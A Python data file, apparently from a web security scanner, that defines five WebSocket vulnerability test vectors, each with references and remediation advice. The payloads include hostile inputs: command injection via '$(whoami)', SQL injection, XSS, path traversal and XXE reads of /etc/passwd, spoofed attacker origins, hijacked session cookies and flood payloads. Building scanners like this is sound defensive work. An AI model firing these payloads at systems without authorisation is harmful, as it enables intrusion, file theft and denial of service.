"""
WebSocket Security Test Vectors
Targets WebSocket protocol vulnerabilities including CSWSH, origin validation, and injection
"""

from ..models import (
    TestVector, VulnerabilityType, TestVectorPosition as Position, PositionType,
    TestVectorPayload as PayloadTemplate, TestVectorEvidence as Evidence, ConfidenceLevel, SensitivityLevel
)

WEBSOCKET_VECTORS = [
    TestVector(
        id="websocket-origin-001",
        name="WebSocket Missing Origin Validation",
        description="Connect to WebSocket endpoint without proper Origin validation",
        vuln_type=VulnerabilityType.WEBSOCKET_VULN,
        position=Position(type=PositionType.HEADER, name="Origin", value_prefix="", value_suffix=""),
        payload=PayloadTemplate(
            base="https://evil.com",
            variants=[
                "null",
                "https://attacker.com",
                "http://localhost",
                "https://victim.com.evil.com"
            ],
            encoding="none"
        ),
        expected_evidence=Evidence(
            indicators=["WebSocket connection accepted", "101 Switching Protocols", "Upgrade: websocket"],
            confidence=ConfidenceLevel.HIGH
        ),
        sensitivity=SensitivityLevel.HIGH,
        tags=["websocket", "origin-validation", "cswsh", "cors", "authentication-bypass"],
        references=[
            "https://portswigger.net/web-security/websockets",
            "https://owasp.org/www-community/attacks/Cross_Site_WebSocket_Hijacking",
            "https://christian-schneider.net/CrossSiteWebSocketHijacking.html"
        ],
        remediation="Validate Origin header against whitelist, implement authentication tokens, use CSRF tokens"
    ),
    
    TestVector(
        id="websocket-cswsh-001",
        name="Cross-Site WebSocket Hijacking (CSWSH)",
        description="Perform CSWSH attack to hijack authenticated WebSocket connections",
        vuln_type=VulnerabilityType.WEBSOCKET_VULN,
        position=Position(type=PositionType.HEADER, name="Cookie", value_prefix="", value_suffix=""),
        payload=PayloadTemplate(
            base="session=victim_session_id",
            variants=[
                "PHPSESSID=victim_session",
                "auth_token=stolen_token",
                "jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.victim_payload"
            ],
            encoding="none"
        ),
        expected_evidence=Evidence(
            indicators=["Authenticated WebSocket connection", "Session accepted", "Private data accessible"],
            confidence=ConfidenceLevel.HIGH
        ),
        sensitivity=SensitivityLevel.CRITICAL,
        tags=["websocket", "cswsh", "session-hijacking", "csrf", "authentication"],
        references=[
            "https://owasp.org/www-community/attacks/Cross_Site_WebSocket_Hijacking",
            "https://www.christian-schneider.net/CrossSiteWebSocketHijacking.html",
            "https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking"
        ],
        remediation="Implement CSRF tokens in WebSocket handshake, validate Origin, use secure authentication"
    ),
    
    TestVector(
        id="websocket-injection-001",
        name="WebSocket Message Injection",
        description="Inject malicious payloads through WebSocket messages to exploit server-side processing",
        vuln_type=VulnerabilityType.WEBSOCKET_VULN,
        position=Position(type=PositionType.BODY_JSON, name="message", value_prefix="", value_suffix=""),
        payload=PayloadTemplate(
            base='{"type":"command","data":"$(whoami)"}',
            variants=[
                '{"type":"sql","query":"1\' OR \'1\'=\'1"}',
                '{"type":"xss","content":"<script>alert(1)</script>"}',
                '{"type":"traversal","path":"../../../../etc/passwd"}',
                '{"type":"xxe","xml":"<?xml version=\\"1.0\\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \\"file:///etc/passwd\\">]><root>&xxe;</root>"}'
            ],
            encoding="none"
        ),
        expected_evidence=Evidence(
            indicators=["Command execution", "SQL injection", "File read", "XSS in broadcast"],
            confidence=ConfidenceLevel.HIGH
        ),
        sensitivity=SensitivityLevel.CRITICAL,
        tags=["websocket", "injection", "command-injection", "xss", "sqli"],
        references=[
            "https://portswigger.net/web-security/websockets",
            "https://book.hacktricks.xyz/pentesting-web/websocket-attacks",
            "https://owasp.org/www-community/vulnerabilities/WebSocket_Security"
        ],
        remediation="Validate and sanitize all WebSocket messages, implement input validation, use parameterized queries"
    ),
    
    TestVector(
        id="websocket-dos-001",
        name="WebSocket Denial of Service",
        description="Exhaust server resources using WebSocket connection flooding or message bombing",
        vuln_type=VulnerabilityType.WEBSOCKET_VULN,
        position=Position(type=PositionType.BODY_JSON, name="payload", value_prefix="", value_suffix=""),
        payload=PayloadTemplate(
            base='{"type":"broadcast","message":"A" * 1000000}',
            variants=[
                '{"type":"loop","iterations":999999}',
                '{"type":"recursive","depth":10000}',
                '{"type":"memory","size":"10GB"}',
                '{"type":"cpu","operation":"heavy_computation"}'
            ],
            encoding="none"
        ),
        expected_evidence=Evidence(
            indicators=["Server unresponsive", "High CPU/memory usage", "Connection timeout", "Service degradation"],
            confidence=ConfidenceLevel.HIGH
        ),
        sensitivity=SensitivityLevel.HIGH,
        tags=["websocket", "dos", "resource-exhaustion", "availability"],
        references=[
            "https://owasp.org/www-community/attacks/Denial_of_Service",
            "https://portswigger.net/web-security/websockets",
            "https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Denial_of_Service_Cheat_Sheet.md"
        ],
        remediation="Implement rate limiting, connection limits, message size limits, timeout mechanisms"
    ),
    
    TestVector(
        id="websocket-auth-bypass-001",
        name="WebSocket Authentication Bypass",
        description="Bypass authentication by exploiting missing auth checks in WebSocket upgrade",
        vuln_type=VulnerabilityType.WEBSOCKET_VULN,
        position=Position(type=PositionType.HEADER, name="Sec-WebSocket-Protocol", value_prefix="", value_suffix=""),
        payload=PayloadTemplate(
            base="admin-protocol",
            variants=[
                "debug-mode",
                "internal-api",
                "admin, unauthorized",
                "bypass-auth"
            ],
            encoding="none"
        ),
        expected_evidence=Evidence(
            indicators=["WebSocket connected without auth", "Admin protocol accepted", "Privileged access"],
            confidence=ConfidenceLevel.HIGH
        ),
        sensitivity=SensitivityLevel.CRITICAL,
        tags=["websocket", "authentication-bypass", "authorization", "privilege-escalation"],
        references=[
            "https://portswigger.net/web-security/websockets",
            "https://owasp.org/www-community/vulnerabilities/WebSocket_Security",
            "https://www.netsparker.com/blog/web-security/websocket-security/"
        ],
        remediation="Implement authentication before WebSocket upgrade, validate tokens, enforce authorization checks"
    )
]
